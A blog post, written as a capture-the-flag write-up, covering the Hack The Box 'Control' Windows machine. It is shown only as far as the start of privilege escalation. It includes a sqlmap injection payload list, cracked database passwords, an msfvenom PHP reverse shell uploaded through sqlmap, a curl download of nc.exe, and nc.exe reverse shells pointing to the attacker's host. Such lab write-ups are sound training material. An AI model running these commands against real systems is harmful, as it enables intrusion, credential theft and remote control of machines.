@@ -1,0 +1,893 @@
+---
+layout: post
+title: "[HTB] Control - write up"
+published: true
+date: 2020-04-13
+description:  This is a very hard box. Though each section is quite informative. The foot hold requires you to leverage proxy login and sql injection. It's a good exercise to familiarise yourself with sqlmap. Then, you'll need to juggle with multiple terminals to get some powershell done. This allows you to connect as the main user. The last bit to get root, is another story. You'll need to work with windows services and inject code in order to change their behaviour.
+img: posts/control/control_logo.png # Add image post (optional)
+tags: [sqlmap, SQLi, MySQL, Proxy, BurpSuit, Services, Reverse Shell, Powershell, Windows, HTB, Hard] # add tag
+os: Windows
+difficulty: Hard
+points: 40
+release: 2019-11-23
+ip: 10.10.10.167
+---
+
+# Summary:
+
+{{ page.description }}
+
+### Foothold:
+
+```sh
+$nmap -sV -sC -oA nmap/default 10.10.10.167
+Nmap 7.80 ( https://nmap.org ) at 2020-04-13 12:09 CEST
+Nmap scan report for 10.10.10.167
+Host is up (0.072s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: eah be
+|_http-title: Fidelity
+135/tcp  open  msrpc   Microsoft Windows RPC
+3306/tcp open  mysql?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
+|_    Host '10.10.14.24' is not allowed to connect to this MariaDB server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+[...]
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.72 seconds
+```
+
+Only three open ports, quite unusual for a windows box. Anyway, we have `http/80`, `msrpc/135` and maybe `mysql/3306`. Let's first look at the website.
+
+
+<img src="{{site.baseurl}}/assets/img/posts/control/Screenshot_2020-04-19_Fidelity.png" alt="Screenshot_2020-04-19_Fidelity" style="display: block;  margin-left: auto; margin-right: auto;" />
+
+We see that there is an admin page and a way to login, however, when we click on it we have an error message
+
+```
+Access Denied: Header Missing. Please ensure you go through the proxy to access this page
+```
+
+Whilst we figure this out, we can fire `ffuf`
+
+```
+$~/Git/ffuf/ffuf -u http://10.10.10.167/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+       /'___\  /'___\           /'___\
+      /\ \__/ /\ \__/  __  __  /\ \__/
+      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+        \ \_\   \ \_\  \ \____/  \ \_\
+         \/_/    \/_/   \/___/    \/_/
+
+      v1.0.2
+________________________________________________
+
+:: Method           : GET
+:: URL              : http://10.10.10.167/FUZZ
+:: Follow redirects : false
+:: Calibration      : false
+:: Timeout          : 10
+:: Threads          : 40
+:: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+                       [Status: 200, Size: 3145, Words: 157, Lines: 89]
+admin.php               [Status: 200, Size: 89, Words: 15, Lines: 1]
+assets                  [Status: 301, Size: 150, Words: 9, Lines: 2]
+images                  [Status: 301, Size: 150, Words: 9, Lines: 2]
+Images                  [Status: 301, Size: 150, Words: 9, Lines: 2]
+index.php               [Status: 200, Size: 3145, Words: 157, Lines: 89]
+uploads                 [Status: 301, Size: 151, Words: 9, Lines: 2]
+:: Progress: [4614/4614] :: Job [1/1] :: 512 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
+```
+
+We see that there is a `uploads` folder, though we cannot reach it. Looking at the source code of the index page, we see an interesting comment
+
+```html
+<!-- To Do:
+			- Import Products
+			- Link to new payment system
+			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
+<!-- Header -->
+```
+
+There is an IP address we may be able to use as a forward proxy. Mozilla has a good description of this HTTP parameter [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For). It's used to tell the server who is connecting, though, with BurpSuit, it can easily be fooled. We one needs to do is, in BurpSuit's proxy thumbnail, in the option, go down to the `Match and replace` and add this parameter.
+
+<img src="{{site.baseurl}}/assets/img/posts/control/Screenshot_at_2020-04-13_13-48-03.png" alt="Screenshot_at_2020-04-13_13-48-03" style="display: block;  margin-left: auto; margin-right: auto;" />
+
+No we can access the admin page through burpsuit proxy. (Just remember not to intercept the packets).
+
+<img src="{{site.baseurl}}/assets/img/posts/control/Screenshot_2020-04-19_admin.png" alt="Screenshot_2020-04-19_admin" style="display: block;  margin-left: auto; margin-right: auto;" />
+
+Looking around, we have some fields we can play around. The first field allows use to search in the database. This is prone to sql injection, we can try different quotes and see what happens. And Indeed, by entering `'`, we see an error message.
+
+<img src="{{site.baseurl}}/assets/img/posts/control/Screenshot_2020-04-19_admin.png" alt="Screenshot_2020-04-19_admin" style="display: block;  margin-left: auto; margin-right: auto;" />
+
+Now we can use burpsuit again to capture the request and see how we it works.
+
+```
+POST /search_products.php HTTP/1.1
+Host: 10.10.10.167
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Origin: http://10.10.10.167
+DNT: 1
+Connection: close
+Referer: http://10.10.10.167/admin.php
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For: 192.168.4.28
+
+productName=test
+```
+
+So when we hit search, the variable `productName` is pased through to `search_products.php`. We can use `sqlmap` ot further scan this vulnerability. For that though, we'll need to specify to `sqlmap` that it needs to use our proxy. For details on how to use `sqlmap`, check this link out [https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/)
+
+```sh
+$sqlmap -u http://10.10.10.167/search_products.php --data productName=1 --proxy http://127.0.0.1:8080
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.3#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:56:24 /2020-04-13/
+
+[14:56:24] [INFO] testing connection to the target URL
+[14:56:26] [INFO] testing if the target URL content is stable
+[14:56:27] [INFO] target URL content is stable
+[14:56:27] [INFO] testing if POST parameter 'productName' is dynamic
+[14:56:28] [WARNING] POST parameter 'productName' does not appear to be dynamic
+[14:56:30] [INFO] heuristic (basic) test shows that POST parameter 'productName' might be injectable (possible DBMS: 'MySQL')
+[14:56:31] [INFO] heuristic (XSS) test shows that POST parameter 'productName' might be vulnerable to cross-site scripting (XSS) attacks
+[14:56:31] [INFO] testing for SQL injection on POST parameter 'productName'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
+[14:56:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:56:43] [WARNING] reflective value(s) found and filtering out
+[14:56:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[14:56:50] [INFO] testing 'Generic inline queries'
+[14:56:51] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[14:56:57] [INFO] POST parameter 'productName' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[14:56:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[14:56:57] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
+[14:57:22] [INFO] POST parameter 'productName' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[14:57:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:57:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:57:24] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[14:57:29] [INFO] target URL appears to have 6 columns in query
+[15:27:26] [INFO] POST parameter 'productName' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+[15:27:26] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'productName' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+sqlmap identified the following injection point(s) with a total of 97 HTTP(s) requests:
+---
+Parameter: productName (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: productName=-5865' OR 6284=6284#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: productName=1' AND (SELECT 7254 FROM(SELECT COUNT(*),CONCAT(0x7176627a71,(SELECT (ELT(7254=7254,1))),0x71706b6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wKBp
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: productName=1';SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: productName=1' AND (SELECT 3230 FROM (SELECT(SLEEP(5)))cDBW)-- xhpV
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 6 columns
+    Payload: productName=1' UNION ALL SELECT NULL,CONCAT(0x7176627a71,0x4858784b744d434b66704b5674736d4457614d494577654d46424446687274494c616465465a4a45,0x71706b6a71),NULL,NULL,NULL,NULL#
+---
+[15:27:30] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[15:27:32] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.167'
+
+[*] ending @ 15:27:32 /2020-04-13/
+```
+(Do not mind te time stamps, I had to cut and past two runs for the write up)
+
+Great, so we can exploit this with `sqlmap`. Now the fun begins.
+
+# User
+
+What we can do, it be a bit brutal and use the `-a` flag to get all the power from `sqlmap`. This will download the database, and try to crack any password hash found.
+I won't post the ouput as it is pretty long.
+
+```sh
+sqlmap -u http://10.10.10.167/search_products.php --data productName=1 --proxy http://127.0.0.1:8080 -a
+```
+
+What this command also does is download and organises the database for you in csv files. In the `user.csv` file, we find hashes. For me, `sqlmap` with its standard wordlist got the hash for user `manager`, but could crack for `hector`. I tried different list but it did not work in my VM. So I used my local windows machine to run the hashes in Hashcat against rockyou (john bugged on me also). So if you struggle try that. Just remember these are mysql hashes, so for hashcat you'll need `-m 300`. Once you've cracked, you'll get two passwords
+
+```console
+guanicoe@pc C:\Users\guanicoe\Documents\Hashcat\hashcat-5.0.0>hashcat -m 300 -a 0 -O -w 4 hash wordlists\SecLists\Passwords\rockyou.txt -r rules\best64.rule
+hashcat (v5.0.0) starting...
+
+OpenCL Platform #1: NVIDIA Corporation
+======================================
+* Device #1: GeForce GTX 1660, 1536/6144 MB allocatable, 22MCU
+
+Hashes: 3 digests; 3 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 77
+
+Applicable optimizers:
+* Optimized-Kernel
+* Zero-Byte
+* Precompute-Init
+* Precompute-Merkle-Demgard
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Salt
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 31
+
+Watchdog: Temperature abort trigger set to 90c
+
+Dictionary cache hit:
+* Filename..: wordlists\SecLists\Passwords\rockyou.txt
+* Passwords.: 14344384
+* Bytes.....: 139921490
+* Keyspace..: 1104517568
+
+0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
+cfe3eee434b38cbf709ad67a4dcdea476cba7fda:l3tm3!n
+Approaching final keyspace - workload adjusted.
+
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: MySQL4.1/MySQL5
+Hash.Target......: hash
+Time.Started.....: Wed Apr 15 09:47:56 2020 (2 secs)
+Time.Estimated...: Wed Apr 15 09:47:58 2020 (0 secs)
+Guess.Base.......: File (wordlists\SecLists\Passwords\rockyou.txt)
+Guess.Mod........: Rules (rules\best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   596.3 MH/s (152.12ms) @ Accel:512 Loops:77 Thr:256 Vec:1
+Recovered........: 2/3 (66.67%) Digests, 0/1 (0.00%) Salts
+Progress.........: 1104517568/1104517568 (100.00%)
+Rejected.........: 238238/1104517568 (0.02%)
+Restore.Point....: 14344384/14344384 (100.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
+Candidates.#1....: 984559 -> *amos!
+Hardware.Mon.#1..: Temp: 51c Fan:  0% Util: 51% Core:1530MHz Mem:4001MHz Bus:16
+
+Started: Wed Apr 15 09:47:52 2020
+Stopped: Wed Apr 15 09:47:59 2020
+
+guanicoe@pc C:\Users\guanicoe\Documents\Hashcat\hashcat-5.0.0>hashcat -m 300 --show hash
+cfe3eee434b38cbf709ad67a4dcdea476cba7fda:l3tm3!n
+0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
+```
+
+- `manager : l3tm3!n`
+- `hector : l33th4x0rhector`
+
+We can ask `sqlmap` which user we currently are
+
+```sh
+$sqlmap -u http://10.10.10.167/search_products.php --data productName=1 --proxy http://127.0.0.1:8080 --current-user
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[...]
+
+[17:06:19] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[17:06:19] [INFO] fetching current user
+current user: 'manager@localhost'
+[17:06:19] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.167'
+
+[*] ending @ 17:06:19 /2020-04-19/
+```
+
+So we are indeed accessing the database as `manager`. So second question we can ask is: what privileges does manarger have ?
+
+```sh
+$sqlmap -u http://10.10.10.167/search_products.php --data productName=1 --proxy http://127.0.0.1:8080 --privileges
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.3#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[...]
+
+[17:08:55] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[17:08:55] [INFO] fetching database users privileges
+database management system users privileges:
+[*] 'hector'@'localhost' (administrator) [29]:
+    privilege: ALTER
+    privilege: ALTER ROUTINE
+    privilege: CREATE
+    privilege: CREATE ROUTINE
+    privilege: CREATE TABLESPACE
+    privilege: CREATE TEMPORARY TABLES
+    privilege: CREATE USER
+    privilege: CREATE VIEW
+    privilege: DELETE
+    privilege: DELETE HISTORY
+    privilege: DROP
+    privilege: EVENT
+    privilege: EXECUTE
+    privilege: FILE
+    privilege: INDEX
+    privilege: INSERT
+    privilege: LOCK TABLES
+    privilege: PROCESS
+    privilege: REFERENCES
+    privilege: RELOAD
+    privilege: REPLICATION CLIENT
+    privilege: REPLICATION SLAVE
+    privilege: SELECT
+    privilege: SHOW DATABASES
+    privilege: SHOW VIEW
+    privilege: SHUTDOWN
+    privilege: SUPER
+    privilege: TRIGGER
+    privilege: UPDATE
+[*] 'manager'@'localhost' [1]:
+    privilege: FILE
+[*] 'root'@'127.0.0.1' (administrator) [29]:
+    privilege: ALTER
+    privilege: ALTER ROUTINE
+    privilege: CREATE
+    privilege: CREATE ROUTINE
+    privilege: CREATE TABLESPACE
+    privilege: CREATE TEMPORARY TABLES
+    privilege: CREATE USER
+    privilege: CREATE VIEW
+    privilege: DELETE
+    privilege: DELETE HISTORY
+    privilege: DROP
+    privilege: EVENT
+    privilege: EXECUTE
+    privilege: FILE
+    privilege: INDEX
+    privilege: INSERT
+    privilege: LOCK TABLES
+    privilege: PROCESS
+    privilege: REFERENCES
+    privilege: RELOAD
+    privilege: REPLICATION CLIENT
+    privilege: REPLICATION SLAVE
+    privilege: SELECT
+    privilege: SHOW DATABASES
+    privilege: SHOW VIEW
+    privilege: SHUTDOWN
+    privilege: SUPER
+    privilege: TRIGGER
+    privilege: UPDATE
+[*] 'root'@'::1' (administrator) [29]:
+    privilege: ALTER
+    privilege: ALTER ROUTINE
+    privilege: CREATE
+    privilege: CREATE ROUTINE
+    privilege: CREATE TABLESPACE
+    privilege: CREATE TEMPORARY TABLES
+    privilege: CREATE USER
+    privilege: CREATE VIEW
+    privilege: DELETE
+    privilege: DELETE HISTORY
+    privilege: DROP
+    privilege: EVENT
+    privilege: EXECUTE
+    privilege: FILE
+    privilege: INDEX
+    privilege: INSERT
+    privilege: LOCK TABLES
+    privilege: PROCESS
+    privilege: REFERENCES
+    privilege: RELOAD
+    privilege: REPLICATION CLIENT
+    privilege: REPLICATION SLAVE
+    privilege: SELECT
+    privilege: SHOW DATABASES
+    privilege: SHOW VIEW
+    privilege: SHUTDOWN
+    privilege: SUPER
+    privilege: TRIGGER
+    privilege: UPDATE
+[*] 'root'@'fidelity' (administrator) [29]:
+    privilege: ALTER
+    privilege: ALTER ROUTINE
+    privilege: CREATE
+    privilege: CREATE ROUTINE
+    privilege: CREATE TABLESPACE
+    privilege: CREATE TEMPORARY TABLES
+    privilege: CREATE USER
+    privilege: CREATE VIEW
+    privilege: DELETE
+    privilege: DELETE HISTORY
+    privilege: DROP
+    privilege: EVENT
+    privilege: EXECUTE
+    privilege: FILE
+    privilege: INDEX
+    privilege: INSERT
+    privilege: LOCK TABLES
+    privilege: PROCESS
+    privilege: REFERENCES
+    privilege: RELOAD
+    privilege: REPLICATION CLIENT
+    privilege: REPLICATION SLAVE
+    privilege: SELECT
+    privilege: SHOW DATABASES
+    privilege: SHOW VIEW
+    privilege: SHUTDOWN
+    privilege: SUPER
+    privilege: TRIGGER
+    privilege: UPDATE
+[*] 'root'@'localhost' (administrator) [29]:
+    privilege: ALTER
+    privilege: ALTER ROUTINE
+    privilege: CREATE
+    privilege: CREATE ROUTINE
+    privilege: CREATE TABLESPACE
+    privilege: CREATE TEMPORARY TABLES
+    privilege: CREATE USER
+    privilege: CREATE VIEW
+    privilege: DELETE
+    privilege: DELETE HISTORY
+    privilege: DROP
+    privilege: EVENT
+    privilege: EXECUTE
+    privilege: FILE
+    privilege: INDEX
+    privilege: INSERT
+    privilege: LOCK TABLES
+    privilege: PROCESS
+    privilege: REFERENCES
+    privilege: RELOAD
+    privilege: REPLICATION CLIENT
+    privilege: REPLICATION SLAVE
+    privilege: SELECT
+    privilege: SHOW DATABASES
+    privilege: SHOW VIEW
+    privilege: SHUTDOWN
+    privilege: SUPER
+    privilege: TRIGGER
+    privilege: UPDATE
+
+[17:08:55] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.167'
+
+[*] ending @ 17:08:55 /2020-04-19/
+```
+
+In this long output, we see that manager only has one:
+
+```sh
+[*] 'manager'@'localhost' [1]:
+    privilege: FILE
+```
+
+So we can leverage this to upload a reverse shell. To creat it, we'll use msfvenom
+
+```sh
+$msfvenom -p php/reverse_php LHOST=10.10.14.30 LPORT=1231 --platform php -e generic/none -f raw -o pl.php
+[-] No arch selected, selecting arch: php from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none succeeded with size 3002 (iteration=0)
+generic/none chosen with final size 3002
+Payload size: 3002 bytes
+Saved as: pl.php
+```
+
+and now we try to upload it. The question is where. From the `nmap` output, we saw that the server was running `Microsoft IIS httpd 10.0`. A ~quick~ painfull google search tells us that the default folder for this server service is `C:\inetpub\wwwroot`. Moreover, from our `ffuf` scan, we saw an `uploads` folder, so let's try `/inetpub/wwwroot/uploads/`
+
+
+```sh
+$sqlmap -u http://10.10.10.167/search_products.php --data productName=1 --proxy http://127.0.0.1:8080 --file-write=pl.php --file-dest=/inetpub/wwwroot/uploads/pl.php
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.3#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[...]
+[17:12:53] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[17:12:53] [INFO] fingerprinting the back-end DBMS operating system
+[17:12:53] [INFO] the back-end DBMS operating system is Windows
+[17:12:54] [WARNING] potential permission problems detected ('Access denied')
+[17:12:57] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+do you want confirmation that the local file 'pl.php' has been successfully written on the back-end DBMS file system ('/inetpub/wwwroot/uploads/pl.php')? [Y/n]
+[17:13:03] [INFO] the local file 'pl.php' and the remote file '/inetpub/wwwroot/uploads/pl.php' have the same size (3002 B)
+[17:13:03] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.167'
+
+[*] ending @ 17:13:03 /2020-04-19/
+
+```
+
+And apparently that works. We can therefore prepare a netcat listner, and navigate to the page [http://10.10.10.167/uploads/pl.php](http://10.10.10.167/uploads/pl.php).
+
+```sh
+$nc -lnvp 1231
+listening on [any] 1231 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.10.10.167] 62983
+whoami
+nt authority\iusr
+```
+
+Cool, we got something, but we are not there yet, we'll need this shell to connect back to use. For that, we need to upload `nc.exe`. **WARNING: I tried with the `nc.exe` from a github repo, and it did not work. However, the `nc.exe` from `/usr/share/windows-resources/binaries/nc.exe` will. So copy this binary to your working directory and upload it with curl. That is creat a python server on your local machine `python -m SimpleHTTPServer`, and upload it using `curl http://10.10.14.30:8000/nc.exe -o nc.exe`. Stay in the uploads directory. Putting this bin elsewhere kept triggering something that deleted it for me. With that we can reconnect to use with a second nc listener.
+
+```sh
+$nc -lvnp 4422
+listening on [any] 4422 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.10.10.167] 62986
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\inetpub\wwwroot\uploads> whoami
+whoami
+nt authority\iusr
+PS C:\inetpub\wwwroot\uploads>
+```
+
+Great so now we have a proper powershell. Let's try to get user
+
+# User
+
+Getting user is actually quite simple is you remember old boxes, or if you look at [https://0xdf.gitlab.io/2020/03/28/htb-sniper.html](https://0xdf.gitlab.io/2020/03/28/htb-sniper.html). It's a simple case of executing `nc.exe` with `hector`, as we have some creds.
+
+```powershell
+PS C:\Users> hostname
+hostname
+Fidelity
+PS C:\Users> $user="Fidelity\Hector"
+$user="Fidelity\Hector"
+PS C:\Users> $pass ="l33th4x0rhector"
+$pass ="l33th4x0rhector"
+PS C:\Users> $secstr = New-Object -TypeName System.Security.SecureString
+$secstr = New-Object -TypeName System.Security.SecureString
+PS C:\Users> $pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+PS C:\Users> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
+PS C:\Users> Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
+Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
+control\hector
+```
+
+We can now see that we can run commands as `hector`. So let's make another listner and go from there
+
+```powershell
+PS C:\inetpub\wwwroot\uploads> Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\uploads\nc.exe -e powershell 10.10.14.30 4441 } -Credential $cred -Computer localhost
+Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\uploads\nc.exe -e powershell 10.10.14.30 4441 } -Credential $cred -Computer localhost
+```
+
+and on our listener we get
+
+```sh
+$nc -lnvp 4441
+listening on [any] 4441 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.10.10.167] 62993
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Hector\Documents> whoami
+whoami
+control\hector
+PS C:\Users\Hector\Documents> cd ../Desktop
+cd ../Desktop
+PS C:\Users\Hector\Desktop> type user.txt
+type user.txt
+d8782dd01fb15b72c4b5ba77ef2d472b
+PS C:\Users\Hector\Desktop>
+```
+
+# Root
+
+You though this was convoluted so far, well wait to see what's coming. So after looking around, I went back to [https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html), where he shows use how to look for the history of powershell commands. This is something I'll do from now one on similar boxes. We see a file with two commands.
+
+```powershell
+PS C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
+type ConsoleHost_history.txt
+get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
+get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
+```
+
+Let's run them
+
+```powershell
+PS C:\Users\Hector\Desktop> get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
+get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
+
+
+Property      : {BootDriverFlags, CurrentUser, EarlyStartServices, PreshutdownOrder...}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Control
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 121
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 11
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
+
+Property      : {NextParentID.daba3ff.2, NextParentID.61aaa01.3, NextParentID.1bd7f811.4, NextParentID.2032e665.5...}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Enum
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 17
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 27
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
+
+Property      : {}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Hardware Profiles
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 3
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 0
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
+
+Property      : {}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Policies
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 0
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 0
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
+
+Property      : {}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Services
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 672
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 0
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
+
+Property      : {}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Software
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 1
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 0
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
+
+PS C:\Users\Hector\Desktop> get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
+get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
+
+
+Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
+Owner  : BUILTIN\Administrators
